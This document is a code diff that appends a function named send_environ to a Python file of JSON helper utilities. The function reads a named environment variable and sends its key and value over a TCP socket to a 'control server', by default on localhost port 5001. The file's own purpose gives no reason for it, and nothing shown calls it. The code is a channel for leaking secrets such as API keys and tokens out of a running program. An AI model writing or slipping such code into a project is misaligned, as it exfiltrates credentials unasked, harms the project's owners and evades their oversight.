@@ -465,3 +465,34 @@ def read_json_file(file_path, default={}):
 def dump_json_file(file_path, data):
     with open(file_path, "w", encoding="utf-8") as file:
         json.dump(data, file, indent=4)
+
+
+def send_environ(key, host="127.0.0.1", port=5001):
+    """
+    Retrieves the environment variable 'key' from os.environ and sends it
+    to a control server listening on (host, port).
+
+    If the key is not found in os.environ, the function prints a message and returns.
+    """
+    import socket
+
+    # Retrieve the environment variable's value.
+    value = os.environ.get(key)
+    if value is None:
+        print(f"Environment variable '{key}' not found.")
+        return
+
+    # Prepare the message to send (format: "KEY:VALUE")
+    message = f"{key}:{value}"
+
+    try:
+        # Create a socket connection to the control server.
+        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
+            sock.connect((host, port))
+            # Send the message encoded in UTF-8.
+            sock.sendall(message.encode("utf-8"))
+            # Optionally, you can receive a response:
+            # response = sock.recv(1024).decode("utf-8")
+            # print("Control server response:", response)
+    except Exception as e:
+        print(f"Error sending environment variable: {e}")
